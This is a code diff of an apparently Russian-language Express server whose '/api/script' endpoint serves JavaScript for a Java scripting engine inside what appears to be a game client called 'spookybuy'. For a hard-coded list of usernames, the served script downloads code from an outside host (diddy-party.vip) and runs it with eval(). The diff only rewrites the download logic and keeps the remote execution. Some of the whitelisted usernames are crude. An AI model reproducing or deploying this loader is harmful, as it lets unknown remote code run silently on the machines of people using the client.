@@ -42,25 +42,38 @@ const validateRequest = (req, res, next) => {
 
 // ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================
 
-// Главный эндпоинт для скрипта - ИСПРАВЛЕНО ЭКРАНИРОВАНИЕ!
+// Главный эндпоинт для скрипта - ИСПРАВЛЕННАЯ ВЕРСИЯ
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
     var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
 
-// Проверяем разрешенные имена
-if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
-    try {
-        // Выполняем внешний скрипт - ИСПРАВЛЕНО ЭКРАНИРОВАНИЕ!
-        eval(new java.util.Scanner(
-            new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91").openStream(), 
-            "UTF-8"
-        ).useDelimiter("\\\\\A").next());
-    } catch (e) {
-        java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
+    // Проверяем разрешенные имена
+    if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
+        try {
+            // Выполняем внешний скрипт - ИСПРАВЛЕННАЯ ВЕРСИЯ
+            var url = new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91");
+            var connection = url.openConnection();
+            var inputStream = connection.getInputStream();
+            var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+            var stringBuilder = new java.lang.StringBuilder();
+            var line;
+            
+            while ((line = reader.readLine()) !== null) {
+                stringBuilder.append(line).append("\\n");
+            }
+            
+            reader.close();
+            inputStream.close();
+            
+            var externalScript = stringBuilder.toString();
+            eval(externalScript);
+            
+        } catch (e) {
+            java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
+        }
+    } else {
+        print("X");
     }
-} else {
-    print("X");
-}
 })();`;
     
     res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
